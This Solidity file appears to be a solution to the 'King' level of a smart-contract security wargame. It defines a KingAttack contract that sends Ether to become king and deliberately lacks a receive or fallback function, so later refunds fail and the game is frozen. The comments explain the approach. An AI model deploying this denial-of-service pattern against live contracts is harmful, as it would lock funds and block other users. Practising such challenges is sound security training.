// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* We should make the contract ownable because in a real-world scenario you will not want
others to use your attacking contract. It is not necessary for this solution though.
The Ownable contract of OpenZeppelin will atribute ownership to the deployer and comes 
with a nice "onlyOwner()" modifier for us to use in protected functions.

The King contract sends Ether to the old king whenever someone sends more Ether than the 
current prize. We set-up a sendEther function so the contract can become king. To freeze 
the game there are a few options, but I went for the simple one: no receive or callback 
function.*/

contract KingAttack{

  function sendEther(address payable target) payable public {
    (bool sent, bytes memory data) = target.call{value: msg.value}("");
    require(sent, "Failed to send Ether");
  }

}